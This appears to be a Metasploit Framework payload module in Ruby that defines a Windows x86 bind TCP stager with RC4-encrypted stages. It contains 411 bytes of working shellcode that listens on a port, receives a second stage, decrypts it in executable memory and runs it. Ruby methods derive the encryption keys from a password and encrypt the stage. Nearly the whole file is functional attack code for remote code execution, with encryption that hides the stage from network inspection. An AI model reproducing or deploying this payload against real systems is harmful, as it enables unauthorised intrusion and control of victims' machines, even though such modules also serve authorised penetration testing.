# -*- coding: binary -*-
##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'
require 'msf/core/handler/bind_tcp'


module Metasploit3

  include Msf::Payload::Stager
  include Msf::Payload::Windows

  def self.handler_type_alias
    "bind_tcp_rc4"
  end

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Bind TCP Stager (RC4 stage encryption)',
      'Description'   => 'Listen for a connection',
      'Author'        => ['hdm', 'skape', 'sf', 'mihi'],
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X86,
      'Handler'       => Msf::Handler::BindTcp,
      'Convention'    => 'sockedi',
      'Stager'        =>
        {
          'RequiresMidstager' => false,
          'Offsets' =>
            {
              'LPORT'  => [ 200, 'n' ],
              'XORKey' => [ 260, '' ],
              'RC4Key' => [ 324, '' ]
            },
          'Payload' =>
            # Length: 411 bytes
            "\xFC\xE8\x89\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B" +
            "\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0" +
            "\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF0\x52\x57" +
            "\x8B\x52\x10\x8B\x42\x3C\x01\xD0\x8B\x40\x78\x85\xC0\x74\x4A\x01" +
            "\xD0\x50\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x3C\x49\x8B\x34\x8B" +
            "\x01\xD6\x31\xFF\x31\xC0\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF4" +
            "\x03\x7D\xF8\x3B\x7D\x24\x75\xE2\x58\x8B\x58\x24\x01\xD3\x66\x8B" +
            "\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24" +
            "\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12\xEB\x86\x5D" +
            "\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x54\x68\x4C\x77\x26\x07" +
            "\xFF\xD5\xB8\x90\x01\x00\x00\x29\xC4\x54\x50\x68\x29\x80\x6B\x00" +
            "\xFF\xD5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xEA\x0F\xDF\xE0\xFF" +
            "\xD5\x97\x31\xDB\x53\x68\x02\x00\x11\x5C\x89\xE6\x6A\x10\x56\x57" +
            "\x68\xC2\xDB\x37\x67\xFF\xD5\x53\x57\x68\xB7\xE9\x38\xFF\xFF\xD5" +
            "\x53\x53\x57\x68\x74\xEC\x3B\xE1\xFF\xD5\x57\x97\x68\x75\x6E\x4D" +
            "\x61\xFF\xD5\x6A\x00\x6A\x04\x56\x57\x68\x02\xD9\xC8\x5F\xFF\xD5" +
            "\x8B\x36\x81\xF6\x58\x4F\x52\x4B\x8D\x0E\x6A\x40\x68\x00\x10\x00" +
            "\x00\x51\x6A\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x8D\x98\x00\x01\x00" +
            "\x00\x53\x56\x50\x6A\x00\x56\x53\x57\x68\x02\xD9\xC8\x5F\xFF\xD5" +
            "\x01\xC3\x29\xC6\x85\xF6\x75\xEC\x5B\x59\x5D\x55\x57\x89\xDF\xE8" +
            "\x10\x00\x00\x00\x52\x43\x34\x4B\x65\x79\x4D\x65\x74\x61\x73\x70" +
            "\x6C\x6F\x69\x74\x5E\x31\xC0\xAA\xFE\xC0\x75\xFB\x81\xEF\x00\x01" +
            "\x00\x00\x31\xDB\x02\x1C\x07\x89\xC2\x80\xE2\x0F\x02\x1C\x16\x8A" +
            "\x14\x07\x86\x14\x1F\x88\x14\x07\xFE\xC0\x75\xE8\x31\xDB\xFE\xC0" +
            "\x02\x1C\x07\x8A\x14\x07\x86\x14\x1F\x88\x14\x07\x02\x14\x1F\x8A" +
            "\x14\x17\x30\x55\x00\x45\x49\x75\xE5\x5F\xC3"
        }
      ))

    register_options([
      OptString.new("RC4PASSWORD", [true, "Password to derive RC4 key from"])
    ], self.class)
  end

  def generate_stage
    p = super
    m = OpenSSL::Digest::Digest.new('sha1')
    m.reset
    key = m.digest(datastore["RC4PASSWORD"] || "")
    c1 = OpenSSL::Cipher::Cipher.new('RC4')
    c1.decrypt
    c1.key=key[4,16]
    p = c1.update(p)
    return [ p.length ^ key[0,4].unpack('V')[0] ].pack('V') + p
  end

  def internal_generate
    p = super
    m = OpenSSL::Digest::Digest.new('sha1')
    m.reset
    key = m.digest(datastore["RC4PASSWORD"] || "")
    p[offsets['XORKey'][0], 4] = key[0,4]
    p[offsets['RC4Key'][0], 16] = key[4,16]
    return p
  end

  def replace_var(raw, name, offset, pack)
    if (name == 'XORKey' or name == 'RC4Key')
      #will be replaced by internal_generate
      return true
    end
    super
  end

  def handle_intermediate_stage(conn, payload)
    return false
  end
end
